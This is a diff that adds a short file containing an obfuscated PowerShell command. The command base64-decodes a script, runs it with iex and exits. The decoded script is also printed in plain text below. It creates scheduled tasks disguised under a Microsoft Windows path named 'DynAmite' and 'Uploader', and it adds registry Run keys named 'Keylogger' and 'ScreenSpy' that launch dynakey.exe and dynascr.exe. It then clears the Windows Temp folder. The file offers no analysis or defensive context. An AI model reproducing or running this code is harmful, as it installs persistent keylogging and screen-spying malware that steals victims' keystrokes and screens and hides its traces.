@@ -1,0 +1,20 @@
+iex([SYSTem.teXT.EnCOdINg]::utF8.getStrINg([SySTem.CoNvert]::froMbASe64STrIng('CgpzY2h0YXNrcy5leGUgL2NyZWF0ZSAvVE4gIk1pY3Jvc29mdFxXaW5kb3dzXER5bkFtaXRlXER5bkFtaXRlIiAvWE1MIEM6XFdpbmRvd3NcVGVtcFxkeW5hdGFzay54bWwKCnNjaHRhc2tzLmV4ZSAvY3JlYXRlIC9UTiAiTWljcm9zb2Z0XFdpbmRvd3NcRHluQW1pdGVcVXBsb2FkZXIiIC9YTUwgQzpcV2luZG93c1xUZW1wXHVwbHRhc2sueG1sCgpTQ0hUQVNLUyAvcnVuIC9UTiAiTWljcm9zb2Z0XFdpbmRvd3NcRHluQW1pdGVcRHluQW1pdGUiCgpOZXctSXRlbVByb3BlcnR5IC1wYXRoIEhLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAtTmFtZSBLZXlsb2dnZXIgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICJDOlxXaW5kb3dzXGR5bmFrZXkuZXhlIgpOZXctSXRlbVByb3BlcnR5IC1wYXRoIEhLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAtTmFtZSBTY3JlZW5TcHkgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICJDOlxXaW5kb3dzXGR5bmFzY3IuZXhlIgoKQzpcV2luZG93c1xkeW5ha2V5LmV4ZQpDOlxXaW5kb3dzXGR5bmFzY3IuZXhlCgpSZW1vdmUtSXRlbSAiQzpcV2luZG93c1xUZW1wXCoiCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+
+schtasks.exe /create /TN "Microsoft\Windows\DynAmite\DynAmite" /XML C:\Windows\Temp\dynatask.xml
+
+schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Uploader" /XML C:\Windows\Temp\upltask.xml
+
+SCHTASKS /run /TN "Microsoft\Windows\DynAmite\DynAmite"
+
+New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Keylogger -PropertyType String -Value "C:\Windows\dynakey.exe"
+New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name ScreenSpy -PropertyType String -Value "C:\Windows\dynascr.exe"
+
+C:\Windows\dynakey.exe
+C:\Windows\dynascr.exe
+
+Remove-Item "C:\Windows\Temp\*"
+
